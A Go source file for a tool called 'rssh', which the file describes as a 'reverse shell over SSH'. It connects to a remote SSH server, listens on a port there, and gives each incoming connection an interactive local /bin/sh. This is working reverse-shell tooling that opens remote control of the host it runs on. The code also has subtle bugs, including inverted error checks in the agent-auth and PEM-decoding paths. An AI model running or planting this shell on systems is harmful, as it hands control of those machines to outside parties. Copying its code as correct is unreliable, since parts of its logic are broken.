package main

import (
	"bufio"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"comail.io/go/colog"
	"github.com/bgentry/speakeasy"
	"github.com/kr/pty"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
	"golang.org/x/crypto/ssh/terminal"
)

var (
	// Global flags
	flagTrace   bool
	flagVerbose bool
	flagQuiet   bool

	// Local flags
	flagSSHUsername     string
	flagSSHPassword     string
	flagSSHIdentityFile string
	flagAddr            string
	flagCommand         string

	// Logger instance
	logger *log.Logger
)

var mainCommand = &cobra.Command{
	Use:              "rssh <remote host>",
	Short:            "reverse shell over SSH",
	Run:              runMain,
	PersistentPreRun: preRun,
}

func init() {
	// Global flags
	pf := mainCommand.PersistentFlags()
	pf.BoolVarP(&flagVerbose, "verbose", "v", false, "be more verbose")
	pf.BoolVarP(&flagQuiet, "quiet", "q", false, "be quiet")
	pf.BoolVarP(&flagTrace, "trace", "t", false, "be very verbose")

	// Local flags
	flags := mainCommand.Flags()
	flags.StringVarP(&flagSSHUsername, "username", "u", os.Getenv("USER"),
		"connect as the given user")
	flags.StringVarP(&flagSSHPassword, "password", "p", "",
		"use the given password to connect")
	flags.StringVarP(&flagSSHIdentityFile, "identity-file", "i", "",
		"use the given SSH key to connect to the remote host")
	flags.StringVarP(&flagAddr, "address", "a", "localhost:8080",
		"address to listen on on the remote host")
	flags.StringVarP(&flagCommand, "command", "c", "/bin/sh",
		"command to run")
}

func preRun(cmd *cobra.Command, args []string) {
	var cl *colog.CoLog
	logger, cl = makeLogger()

	if flagTrace {
		cl.SetMinLevel(colog.LTrace)
	} else if flagVerbose {
		cl.SetMinLevel(colog.LDebug)
	} else if flagQuiet {
		cl.SetMinLevel(colog.LWarning)
	} else {
		cl.SetMinLevel(colog.LInfo)
	}

}

func main() {
	mainCommand.Execute()
}

func runMain(cmd *cobra.Command, args []string) {
	if len(args) != 1 {
		log.Printf("error: invalid number of arguments (expected 1, got %d)", len(args))
		os.Exit(1)
	}

	sshHost := args[0]

	// Add a default ':22' after the end if we don't have a colon.
	if !strings.Contains(sshHost, ":") {
		sshHost += ":22"
	}

	config := &ssh.ClientConfig{
		User: flagSSHUsername,
		Auth: nil,
	}

	// Password auth or prompt callback
	if flagSSHPassword != "" {
		log.Println("trace: adding password auth")
		config.Auth = append(config.Auth, ssh.Password(flagSSHPassword))
	} else {
		log.Println("trace: adding password callback auth")
		config.Auth = append(config.Auth, ssh.PasswordCallback(func() (string, error) {
			prompt := fmt.Sprintf("%s@%s's password: ", flagSSHUsername, sshHost)
			return speakeasy.Ask(prompt)
		}))
	}

	// Key auth
	if flagSSHIdentityFile != "" {
		auth, err := loadPrivateKey(flagSSHIdentityFile)
		if err != nil {
			log.Fatalf("error: could not load identity file '%s': %s",
				flagSSHIdentityFile, err)
		}

		log.Println("trace: adding identity file auth")
		config.Auth = append(config.Auth, auth)
	}

	// SSH agent auth
	if agentConn, err := net.Dial("unix", os.Getenv("SSH_AUTH_SOCK")); err != nil {
		log.Println("trace: adding ssh agent auth")
		config.Auth = append(config.Auth,
			ssh.PublicKeysCallback(agent.NewClient(agentConn).Signers))
	}

	config.Auth = append(config.Auth,
		ssh.KeyboardInteractive(func(user, instruction string, questions []string, echos []bool) (answers []string, err error) {
			var (
				ans string
				b   []byte
			)

			for i, q := range questions {
				prompt := fmt.Sprintf("[question %d/%d] %s", i+1, len(questions), q)

				if echos[i] {
					fmt.Print(prompt)
					bio := bufio.NewReader(os.Stdin)
					b, _, err = bio.ReadLine()
					ans = string(b)
				} else {
					ans, err = speakeasy.Ask(prompt)
				}
				if err != nil {
					return
				}

				answers = append(answers, ans)
			}

			return
		}))

	// TODO: keyboard-interactive auth, e.g. for two-factor

	// Dial the SSH connection
	log.Printf("debug: attempting %d authentication methods (%+v)", len(config.Auth), config.Auth)
	sshConn, err := ssh.Dial("tcp", sshHost, config)
	if err != nil {
		log.Fatalf("error: error dialing remote host: %s", err)
	}
	defer sshConn.Close()

	// Listen on remote
	l, err := sshConn.Listen("tcp", flagAddr)
	if err != nil {
		log.Fatalf("error: error listening on remote host: %s", err)
	}

	// Start accepting shell connections
	log.Printf("info: listening for connections on %s (remote listen address: %s)", sshHost, flagAddr)
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Printf("error: error accepting connection: %s", err)
			continue
		}

		log.Printf("info: accepted connection from: %s", conn.RemoteAddr())
		go handleConnection(conn)
	}
}

func handleConnection(c net.Conn) {
	defer c.Close()

	// Start the command
	cmd := exec.Command(flagCommand)

	// Create PTY
	pty, tty, err := pty.Open()
	if err != nil {
		log.Printf("error: could not open PTY: %s", err)
		return
	}
	defer tty.Close()
	defer pty.Close()

	// Put the TTY into raw mode
	_, err = terminal.MakeRaw(int(tty.Fd()))
	if err != nil {
		log.Printf("warn: could not make TTY raw: %s", err)
	}

	// Hook everything up
	cmd.Stdout = tty
	cmd.Stdin = tty
	cmd.Stderr = tty
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}

	cmd.SysProcAttr.Setctty = true
	cmd.SysProcAttr.Setsid = true

	// Start command
	err = cmd.Start()
	if err != nil {
		log.Printf("error: could not start command: %s", err)
		return
	}

	errs := make(chan error, 3)

	go func() {
		_, err := io.Copy(c, pty)
		errs <- err
	}()
	go func() {
		_, err := io.Copy(pty, c)
		errs <- err
	}()
	go func() {
		errs <- cmd.Wait()
	}()

	// Wait for a single error, then shut everything down. Since returning from
	// this function closes the connection, we just read a single error and
	// then continue.
	<-errs
	log.Printf("info: connection from %s finished", c.RemoteAddr())
}

func loadPrivateKey(path string) (ssh.AuthMethod, error) {
	// Read file
	keyData, err := ioutil.ReadFile(path)
	if err != nil {
		log.Printf("error: could not read key file '%s': %s", path, err)
		return nil, err
	}

	// Get first PEM block
	block, _ := pem.Decode(keyData)
	if err != nil {
		log.Printf("error: no key found in file '%s': %s", path, err)
		return nil, err
	}

	// If it's encrypted...
	var (
		signer    ssh.Signer
		signerErr error
	)

	if x509.IsEncryptedPEMBlock(block) {
		// Get the passphrase
		prompt := fmt.Sprintf("Enter passphrase for key '%s': ", path)
		pass, err := speakeasy.Ask(prompt)
		if err != nil {
			log.Printf("error: error getting passphrase: %s", err)
			return nil, err
		}

		block.Bytes, err = x509.DecryptPEMBlock(block, []byte(pass))
		if err != nil {
			log.Printf("error: error decrypting key: %s", err)
			return nil, err
		}

		key, err := ParsePEMBlock(block)
		if err != nil {
			log.Printf("error: could not parse PEM block: %s", err)
			return nil, err
		}

		signer, signerErr = ssh.NewSignerFromKey(key)
	} else {
		signer, signerErr = ssh.ParsePrivateKey(keyData)
	}

	if signerErr != nil {
		log.Printf("error: error parsing private key '%s': %s", path, signerErr)
		return nil, signerErr
	}

	return ssh.PublicKeys(signer), nil
}

// See: https://github.com/golang/crypto/blob/master/ssh/keys.go#L598
func ParsePEMBlock(block *pem.Block) (interface{}, error) {
	switch block.Type {
	case "RSA PRIVATE KEY":
		return x509.ParsePKCS1PrivateKey(block.Bytes)
	case "EC PRIVATE KEY":
		return x509.ParseECPrivateKey(block.Bytes)
	case "DSA PRIVATE KEY":
		return ssh.ParseDSAPrivateKey(block.Bytes)
	default:
		return nil, fmt.Errorf("ssh: unsupported key type %q", block.Type)
	}
}

func makeLogger() (*log.Logger, *colog.CoLog) {
	// Create logger
	logger := log.New(os.Stderr, "", 0)

	// Create colog instance
	cl := colog.NewCoLog(os.Stderr, "", 0)

	// TODO: can set custom headers here
	// colog.AddHeader("[foo] ", colog.LError)

	// Overwrite both standard library and custom logger with this colog instance.
	log.SetOutput(cl)
	logger.SetOutput(cl)

	// Overwrite flags on stdlib logger
	log.SetPrefix("")
	log.SetFlags(0)

	return logger, cl
}
